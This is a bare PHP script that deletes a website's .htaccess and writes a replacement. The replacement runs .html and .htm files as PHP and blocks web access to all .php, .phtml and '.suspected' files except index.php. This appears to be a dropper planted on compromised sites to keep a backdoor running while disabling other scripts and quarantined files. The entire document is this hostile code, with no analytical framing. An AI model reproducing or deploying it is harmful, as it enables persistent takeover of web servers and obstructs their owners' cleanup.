<?php
unlink('.htaccess');
file_put_contents('.htaccess','AddHandler application/x-httpd-php .html .htm
<FilesMatch ".*\.(?i:phtml|php|suspected)$">
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch "(^index.php)$">
Order Allow,Deny
Allow from all
</FilesMatch>');